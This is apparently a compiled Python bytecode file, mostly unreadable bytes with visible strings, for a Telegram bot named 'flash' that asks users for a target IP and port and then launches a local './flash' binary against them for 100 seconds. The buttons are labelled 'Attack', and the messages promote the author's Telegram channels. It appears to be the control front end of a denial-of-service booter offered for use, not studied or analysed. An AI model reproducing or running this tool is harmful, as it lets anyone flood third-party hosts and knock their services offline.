U
    e�
g]  �                   @   s�   d dl Z d dlZd dlmZmZmZ d dlmZmZm	Z	m
Z
mZmZ d dlmZ ejdejd� dZdadadadaeejd	�d
d�Zeejd	�dd�Zeejd	�dd�Zeejd	�dd�Zeejd	�dd�Zeejd	�dd�Zdd� Zedkr�e�  dS )�    N)�Update�InlineKeyboardButton�InlineKeyboardMarkup)�Application�CommandHandler�MessageHandler�CallbackQueryHandler�ContextTypes�filters)�TOKENz4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelz./flash�d   ��update�contextc                 �   s2   t ddd�gg}t|�}| jjd|d�I d H  d S )Nu   🚀Attack🚀�attack�Zcallback_datau_   By https://t.me/FLASH_502 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)��reply_markup)r   r   �message�
reply_text)r   r   �keyboardr   � r   �flash.py�start   s    r   c                 �   s4   | j }|�� I d H  |jdkr0|j�d�I d H  d S )Nr   ua   By https://t.me/FLASH_502 Please enter the target and port in the format: <target> <port>🚀🚀)�callback_query�answer�datar   r   �r   r   Zqueryr   r   r   �button_handler   s    
r    c                 �   s�   | j d kr"| jj �d�I d H  d S zf| j j�� \}}|at|�adat	ddd�gg}t
|�}| j jdt� dt� dt� d	�|d
�I d H  W n& tk
r�   | j �d�I d H  Y nX d S )Nue   Please enter the target and port in the format: <target> <port>🚀🚀 https://t.me/flashmainchannelr   u   Start Attack🚀�start_attackr   zTarget: z, Port: z, Time: zI seconds configured.
Now choose an action:
 https://t.me/flashmainchannelr   uD   Invalid format. Please enter in the format: 
<target> <port>🚀🚀)r   r   r   �text�split�	target_ip�int�target_port�attack_timer   r   �
ValueError)r   r   �targetZportr   r   r   r   r   �handle_input"   s     
��r*   c              
   �   s�   t rtrts$| jj�d�I d H  d S trLt�� d krL| jj�d�I d H  d S zPtj	t
t tt�tt�gtjtjd�a| jj�dt � dt� dt� d��I d H  W nN tk
r� } z0| jj�d|� d	��I d H  t�d|� �� W 5 d }~X Y nX d S )
Nz+Please configure the target and port first.zAttack is already running.)�stdout�stderru    CHIN TAPAK DUM DUM(●'◡'●) �:z for uJ    seconds 
 FeedBack De Dio Yaad se 😡 yha pe :- https://t.me/FLASH_502  zError starting attack: u�    
 Files ka name galt h 
  github me jakar chek kro files ka name kuch aisa hona chahiye 👇
 flash 
 flash.py 
 flashh.py 
 flash.sh )r$   r&   r'   r   r   r   �process�poll�
subprocess�Popen�BINARY_PATH�str�PIPE�	Exception�logging�error)r   r   �er   r   r   r!   ?   s    $,r!   c                 �   sD   t r t �� d kr t ��  t ��  d ad ada| jj�	d�I d H  d S )Nr   uk   Attack reset. By https://t.me/FLASH_502 Please enter the target and port in the format: <target> <port>🚀)
r.   r/   Z	terminate�waitr$   r&   r'   r   r   r   r   r   r   r   �reset_attackR   s    r:   c                 �   sN   | j }|�� I d H  |jdkr0t| |�I d H  n|jdkrJt| |�I d H  d S )Nr!   r:   )r   r   r   r!   r:   r   r   r   r   �button_callback_handler^   s    

r;   c                  C   sl   t �� �t��� } | �tdt�� | �tt	dd�� | �tt
dd�� | �ttjtj @ t�� | ��  d S )Nr   z^attack$)�patternz^(start_attack|reset_attack)$)r   Zbuilder�tokenr   ZbuildZadd_handlerr   r   r   r    r;   r   r
   ZTEXTZCOMMANDr*   Zrun_polling)Zapplicationr   r   r   �mainh   s    r>   �__main__)r0   r6   Ztelegramr   r   r   Ztelegram.extr   r   r   r   r	   r
   Zflashhr   ZbasicConfig�INFOr2   r.   r$   r&   r'   ZDEFAULT_TYPEr   r    r*   r!   r:   r;   r>   �__name__r   r   r   r   �<module>   s&    
